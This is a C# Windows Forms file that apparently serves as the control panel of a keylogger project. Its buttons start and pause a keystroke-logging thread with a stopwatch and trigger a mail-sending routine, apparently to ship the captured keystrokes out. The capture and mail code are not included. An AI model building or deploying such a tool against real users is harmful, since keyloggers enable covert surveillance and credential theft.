using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Threading;


namespace Keyloggerr
{

    public partial class Form1 : Form
    {
        KeyLogger _keylogger = new KeyLogger();
        SendMail sm = new SendMail();
        BackgroundWorker workerThread = null;
        bool _keepRunning = false;
        public Form1()
        {
            InitializeComponent();
            InstantiateWorkerThread();
        }
        private void InstantiateWorkerThread()
        {
            workerThread = new BackgroundWorker();
            workerThread.ProgressChanged += WorkerThread_ProgressChanged;
            workerThread.DoWork += WorkerThread_DoWork;
            workerThread.RunWorkerCompleted += WorkerThread_RunWorkerCompleted;
            workerThread.WorkerReportsProgress = true;
            workerThread.WorkerSupportsCancellation = true;
        }

        private void WorkerThread_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            lblStopWatch.Text = e.UserState.ToString();
        }

        private void WorkerThread_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Cancelled)
            {
                lblStopWatch.Text = "Cancelled";
            }
            else
            {
                lblStopWatch.Text = "Stopped";
            }
        }

        private void WorkerThread_DoWork(object sender, DoWorkEventArgs e)
        {
            DateTime startTime = DateTime.Now;

            _keepRunning = true;

            while (_keepRunning)
            {
                Thread.Sleep(1000);

                string timeElapsedInstring = (DateTime.Now - startTime).ToString(@"hh\:mm\:ss");

                workerThread.ReportProgress(0, timeElapsedInstring);

                if (workerThread.CancellationPending)
                {
                    // this is important as it set the cancelled property of RunWorkerCompletedEventArgs to true
                    e.Cancel = true;
                    break;
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            sm.Sendmail();   
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //Start
            workerThread.RunWorkerAsync();
            _keylogger.StartThread();

        }


        private void button3_Click(object sender, EventArgs e)
        {
            _keepRunning = false;
            _keylogger.PauseThread();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            workerThread.CancelAsync();
        }
    }
}
